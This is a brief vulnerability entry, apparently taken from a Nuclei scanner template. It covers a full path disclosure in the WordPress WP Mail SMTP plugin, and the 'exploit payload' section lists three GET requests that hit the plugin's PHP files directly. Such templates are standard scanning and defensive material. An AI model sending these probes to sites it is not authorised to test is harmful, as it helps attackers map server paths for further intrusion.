# Vulnerability: WordPress WP Mail SMTP - Full Path Disclosure
**Classification:** WP
**Source:** Nuclei Template (`wp-wp-mail-smtp-fpd.yaml`)

## Description
WordPress WP Mail SMTP plugin is vulnerable to full path disclosure via direct access to plugin files.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/wp-mail-smtp/src/WPMailSMTP.php
GET {{BaseURL}}/wp-content/plugins/wp-mail-smtp/vendor/autoload.php
GET {{BaseURL}}/wp-content/plugins/wp-mail-smtp/src/Core.php
```

